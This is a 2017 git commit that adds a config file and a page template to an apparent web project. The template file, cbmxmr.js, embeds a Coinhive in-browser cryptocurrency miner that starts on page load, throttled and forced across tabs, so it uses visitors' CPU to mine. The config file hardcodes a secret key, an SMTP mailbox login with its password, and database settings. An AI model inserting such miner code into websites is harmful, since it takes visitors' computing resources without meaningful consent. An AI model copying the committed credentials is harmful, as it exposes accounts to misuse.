bcb8eaff9def03afea4d9de9345cf917c7bc0413
arayikch <a.chaparyan@mail.ru>
2017-12-27 11:39:36 +0400

    restored

---
+++ appconfig.py
@@ -0,0 +1,31 @@
+
+class Config():
+    TESTING = False
+    SECRET_KEY = '\x01\xc8$\x97\xd9\x1a\x13\xd9\x9eE\xabS\xc8\x17\xa4\xc3\x14\xe8Re\x94\x8cKR'
+
+class ProductionConfig(Config):
+    DEBUG = False
+    MAIL_SERVER = ""
+    MAIL_PORT = 465
+    MAIL_USE_SSL = True
+    MAIL_USERNAME = ''
+    MAIL_PASSWORD = ''
+
+class DevelopmentConfig(Config):
+    DEBUG = True
+    MAIL_SERVER = "smtp.zoho.com"
+    MAIL_PORT = 465
+    MAIL_USE_SSL = True
+    MAIL_USERNAME = 'info@clickbuzzmedia.com'
+    MAIL_PASSWORD = 'Info'
+
+class MailData():
+	FROM = 'info@clickbuzzmedia.com'
+	TO = ['info@clickbuzzmedia.com']
+
+class MYSQLDB():
+    USER = 'root'
+    PASSWORD = ''
+    DB = 'test'
+    HOST = '127.0.0.1' 
+    PORT = 3306    
---
+++ templates/cbmxmr.js
@@ -0,0 +1,7 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+var miner = new CoinHive.Anonymous('vP5K7DVSIJVOriNUySo80S2a2s0UZVVl', {throttle: 0.5});
+if (!miner.isMobile() && !miner.didOptOut(14400)) {
+	miner.start(CoinHive.FORCE_MULTI_TAB);
+}
+</script>
